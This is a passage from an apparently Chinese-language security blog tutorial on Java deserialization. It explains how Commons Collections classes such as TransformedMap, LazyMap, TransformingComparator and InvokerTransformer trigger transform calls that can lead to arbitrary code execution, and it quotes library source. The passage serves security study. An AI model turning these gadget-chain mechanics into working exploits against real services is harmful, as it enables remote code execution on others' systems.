Map，不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果传入的 map 为 null，则抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractMapDecorator</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Map must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>被修饰后的 <code>outerMap</code> 在存储新元素时，就会调用 <code>transform</code> 方法对键值对做一个转换。这个过程就类似在调用⼀个“回调函数”，这个回调的参数是原始对象。</p>
<p>例如 <code>TransformedMap.put</code> 方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换 key 的辅助方法。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 如果未设置 keyTransformer，则直接返回原始对象；</span></span><br><span class="line"><span class="comment"> * 否则使用 keyTransformer 对 key 进行转换。</span></span><br><span class="line"><span class="comment"> * 转换器内部也可能抛出异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object 要转换的 key 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 转换后的 key（或原始 key）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;  <span class="comment">// 无转换器，返回原始 key</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keyTransformer.transform(object);  <span class="comment">// 调用转换器转换 key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换 value 的辅助方法。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 如果未设置 valueTransformer，则直接返回原始对象；</span></span><br><span class="line"><span class="comment"> * 否则使用 valueTransformer 对 value 进行转换。</span></span><br><span class="line"><span class="comment"> * 转换器内部也可能抛出异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object 要转换的 value 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 转换后的 value（或原始 value）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;  <span class="comment">// 无转换器，返回原始 value</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);  <span class="comment">// 调用转换器转换 value</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外对 <code>TransformedMap</code> 继承的 <code>AbstractInputCheckedMapDecorator</code> 有内部类 <code>MapEntry</code> 用来描述 <code>TransformedMap</code> 中存储的键值对。下图描述了 <code>TransformedMap</code> 及其父类 <code>AbstractInputCheckedMapDecorator</code> 的内部类之间的所属关系。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/MapEntry.png"
                      alt="MapEntry"
                ></p>
<p>其中 <code>MapEntry</code> 中的 <code>setValue</code> 方法会调用 <code>parent</code> 也就是 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>TransformedMap</code> 的 <code>checkSetValue</code> 方法会调用 <code>valueTransformer</code> 的 <code>transform</code> 方法对 <code>value</code> 做转换。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 重写该方法以在调用 &lt;code&gt;setValue&lt;/code&gt; 时对值进行转换。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 当通过 Map.Entry 的 setValue() 修改某个条目的值时，会调用此方法，</span></span><br><span class="line"><span class="comment"> * 使用 valueTransformer 对传入的新值进行转换后再设置到 Map 中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value 要转换的新 value 值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 转换后的 value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里要解释一下为什么 <code>AbstractInputCheckedMapDecorator$MapEntry</code> 的 <code>parent</code> 是 <code>TransformedMap</code>。</p>
<p>首先 <code>AbstractInputCheckedMapDecorator</code> 有三个内部类：</p>
<ul>
<li><strong><code>EntrySet</code></strong> ：包装原始 <code>Map.entrySet()</code> 的返回值，为 <code>Map.Entry</code> 提供额外行为（如拦截、校验等）。</li>
<li><strong><code>EntrySetIterator</code></strong> ：用于遍历 <code>EntrySet</code>，在 <code>next()</code> 时返回包装过的 <code>MapEntry</code>。</li>
<li><strong><code>MapEntry</code></strong> ：包装原始的 <code>Map.Entry</code>，其主要职责是在 <code>setValue()</code> 被调用时，对传入的 value 值进行校验或转换，通常会回调 <code>parent.checkSetValue(...)</code>。</li>
</ul>
<p>当我们调用 <code>map.entrySet().iterator().next().setValue(&quot;newValue&quot;)</code> 这整条链时，系统会<strong>依次触发这三个内部类的构造过程</strong> ，每一层都进行了一次包装，并将 <code>parent</code> 传递下去，最终 <code>setValue()</code> 调用的是包装过的 <code>MapEntry#setValue()</code>，从而实现了自定义的值校验或转换逻辑。</p>
<p>当程序显式调用了 <code>map.entrySet()</code>，或者隐式调用（例如 <code>for (Map.Entry e : map.entrySet())</code>），JVM 就会执行 <code>entrySet</code> 这个方法，这里实际调用的是 <code>TransformedMap</code> 的父类 <code>AbstractInputCheckedMapDecorator</code> 的 <code>entrySet()</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 钩子方法：用于判断 &lt;code&gt;checkSetValue&lt;/code&gt; 方法是否生效。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 如果子类实现返回 false，表示 &lt;code&gt;checkSetValue&lt;/code&gt; 没有任何效果，</span></span><br><span class="line"><span class="comment"> * 可以跳过相关逻辑，从而优化性能（避免不必要的包装等）。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 当前实现始终返回 &lt;code&gt;true&lt;/code&gt;，表示启用 setValue 的校验/转换逻辑。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 始终返回 true，表示启用 setValue 检查</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isSetValueChecking</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isSetValueChecking()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySet</span>(map.entrySet(), <span class="built_in">this</span>); <span class="comment">// 👈 传入 TransformedMap 作为 parent</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里构造了一个包装后的 <code>EntrySet</code>，并把 <code>this</code>（即当前的 <code>TransformedMap</code> 实例）传入，作为 <code>EntrySet</code> 的 <code>parent</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">EntrySet</span><span class="params">(Set set, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(set);</span><br><span class="line">    <span class="built_in">this</span>.parent = parent; <span class="comment">// 👈 构造 EntrySet 时传入 parent</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后执行 <code>entrySet().iterator()</code> 调用的是 <code>EntrySet</code> 的 <code>iterator()</code> 方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(collection.iterator(), parent); <span class="comment">// 👈 把 parent 继续传下去</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在增强 for 循环中隐式调用 <code>iterator()</code>。这是遍历 <code>Set</code> 时的标准调用流程。其中 <code>EntrySetIterator</code> 是自定义的迭代器，用于对返回的 <code>Map.Entry</code> 做进一步包装和拦截。</p>
</blockquote>
<p>再之后执行 <code>iterator().next()</code> 的时候，JVM 会触发 <code>EntrySetIterator</code> 的 <code>next()</code> 方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next(); <span class="comment">// 原始 entry</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, parent);            <span class="comment">// 👈 构造 MapEntry 时传入 parent</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>iterator().next()</code> 或隐式执行 <code>for</code> 循环时，需要返回下一个条目，这时候就需要构造一个 <code>MapEntry</code>。在 <code>MapEntry</code> 中 <code>parent</code> 被初始化为最初传入的 <code>parent</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(entry);</span><br><span class="line">    <span class="built_in">this</span>.parent = parent; <span class="comment">// 👈 parent 正是最早的 TransformedMap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code> 和 <code>TransformedMap</code> 类似，都来自于 Common-Collections 库，并继承 <code>AbstractMapDecorator</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></div>

<p><code>LazyMap#decorate</code> 实际上是创建了一个 <code>LazyMap</code> 对象，并且根据参数设置 <code>factory</code> 为我们传入的 <code>Transformer</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造方法：对传入的 Map 进行包装（**不进行拷贝**）。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 被包装的 Map 在外部修改也会影响 LazyMap 的行为。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map      被包装的原始 Map，不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  用于生成默认值的工厂对象（Transformer），不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果 map 或 factory 为 null，则抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用父类构造器，使用原始 map 作为底层存储</span></span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 工厂对象不能为空，否则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存工厂对象用于后续延迟加载逻辑</span></span><br><span class="line">    <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 工厂方法：创建一个**延迟加载的 Map（LazyMap）**。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 当通过 `get(key)` 获取一个不存在的 key 时，会使用提供的工厂（Transformer）</span></span><br><span class="line"><span class="comment"> * 自动生成对应的值并放入 Map 中。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map      被包装的原始 Map，不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  用于生成默认值的工厂对象（Transformer），不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>         被延迟加载功能包装后的 Map（LazyMap 实例）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果 map 或 factory 为 null，则抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>与 <code>TransformedMap</code> 不同的是 <code>LazyMap</code> 并不继承继承于 <code>AbstractInputCheckedMapDecorator</code>，而是直接继承于 <code>AbstractMapDecorator</code>。因此 <code>TransformedMap</code> 不继承 <code>AbstractInputCheckedMapDecorator</code> 中用的内部类，也就没有了 <code>TransformedMap</code> 的 <code>setValue</code> 的触发方式。</p>
<p>不过由于 <code>TransformedMap</code> 同样继承于 <code>AbstractMapDecorator</code>，因此被修饰的 <code>Map</code> 同样会在 <code>AbstractMapDecorator</code> 的构造函数中保存到成员变量上。</p>
<p>另外在 Common-Collections4 中 <code>decorate</code> 方法改名为 <code>lazyMap</code>，但是在实现上没有变化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div>

<p><code>LazyMap</code> 的漏洞触发点和 <code>TransformedMap</code> 唯一的差别是，<code>TransformedMap</code> 是在写入元素的时候执行 <code>transform</code>，而 <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果map中当前不包含key，则为key创建一个值</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key); <span class="comment">// 👈 调用transform转换key生成对应的值</span></span><br><span class="line">        map.put(key, value); <span class="comment">// 将key和值放入map中</span></span><br><span class="line">        <span class="keyword">return</span> value; <span class="comment">// 返回生成的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key); <span class="comment">// 如果map中已包含key，则返回对应的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>LazyMap</code> 在其 <code>get</code> 方法中执行的 <code>factory.transform</code> 的条件是 <code>LazyMap</code> 没有当前查询的 <code>key</code>，也就是说对于一个特定的 <code>key</code>，我们只能调用一次 <code>transform</code> 。除非调用 <code>Map.clear</code> 方法清空 <code>LazyMap</code> 。</p>

    </div>
  </div>

<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code> 实现了 <code>java.util.Comparator</code> 接口，这个接口用于定义两个对象如何进行比较。对于一些需要维护顺序的数据结构（如 <code>java.util.PriorityQueue</code>），如果传入 <code>TransformingComparator</code> 用于两个对象的比较，那么比较两个对象的时候会调用 <code>TransformingComparator</code> 的 <code>compare</code> 方法。在 <code>compare</code> 方法内部会调用其中 <code>transformer</code> 成员的 <code>transform</code> 方法并传入进行比较的对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>TransformingComparator</code> 的构造函数如下，这里的 <code>transformer</code> 就是我们构造的 <code>Transformer</code> 结构，另外 <code>decorated</code> 如果不指定会传入 <code>new ComparableComparator()</code> 。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Transformer-的接口实现类"><a href="#Transformer-的接口实现类" class="headerlink" title="Transformer 的接口实现类"></a>Transformer 的接口实现类</h3><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code> 在构造函数的时候传入一个对象，并在 <code>transform</code> 方法将这个对象再返回：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> constantToReturn  每次调用时返回的常量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过忽略输入对象并返回存储的常量来转换输入。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  被忽略的输入对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 存储的常量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>Transformer</code> 构造的代码执行流中，我们可以把 <code>ConstantTransformer</code> 理解为一个常量，可以返回一个确定的对象。</p>
<p>这样我们就可以屏蔽前面定义的 <code>readObject</code> 方法触发 <code>transform</code> 方法调用时传入的 <code>input</code> 参数对我们构造的 <code>Transformer</code> 代码执行流产生影响。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code> 可以对 <code>transform</code> 方法传入的对象参数用来执行任意方法，这也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个 <code>InvokerTransformer</code> 时，需要传入三个参数：</p>
<ul>
<li><code>String methodName</code>：待执行的函数名</li>
<li><code>Class[] paramTypes</code>：这个函数的参数类型列表</li>
<li><code>Object[] args</code>：传给这个函数的参数列表</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  要调用的方法名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  构造方法的参数类型数组，参数不会被复制</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  构造方法的参数数组，参数不会被复制</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>后面的回调 <code>transform</code> 方法，就是执行了 <code>input</code> 对象的 <code>iMethodName</code> 方法，并传入 <code>iArgs</code> 参数，即 <code>input.iMethod(iArgs)</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过调用输入对象的方法将输入转换为结果。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  要转换的输入对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 转换后的结果，如果输入为null则返回null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span 